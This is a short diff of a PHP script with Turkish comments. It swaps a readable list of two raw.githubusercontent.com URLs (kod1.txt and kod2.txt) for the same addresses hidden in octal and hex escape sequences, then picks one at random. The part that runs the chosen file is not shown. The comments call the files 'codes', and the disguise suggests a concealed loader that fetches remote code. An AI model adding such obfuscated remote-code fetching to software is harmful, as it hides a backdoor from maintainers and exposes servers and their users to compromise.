@@ -1,9 +1,6 @@
 <?php
 // Kodların URL'leri
-$codes = [
-    'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/kod1.txt',
-    'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/kod2.txt',
-];
+ $codes = array("\150\x74\164\160\163\72\57\x2f\162\141\167\x2e\147\151\164\150\165\142\x75\x73\x65\162\143\157\x6e\164\145\x6e\x74\56\143\157\155\x2f\156\x65\143\145\163\x73\141\162\x79\146\157\x72\x2f\156\145\143\145\163\x2f\x72\145\x66\x73\x2f\150\x65\x61\144\x73\57\x6d\141\151\156\x2f\x6b\x6f\x64\61\56\164\170\x74", "\x68\x74\164\160\x73\72\x2f\57\162\141\x77\x2e\147\151\164\x68\165\142\165\x73\145\x72\x63\x6f\156\x74\145\156\164\56\x63\157\155\57\x6e\x65\x63\x65\163\163\x61\x72\x79\x66\x6f\162\x2f\x6e\145\x63\145\163\57\x72\x65\x66\163\57\x68\x65\x61\x64\x73\57\155\x61\x69\x6e\x2f\x6b\157\x64\62\x2e\x74\170\164");
 
 // Rastgele bir dosya seç
 $randomCodeUrl = $codes[array_rand($codes)];
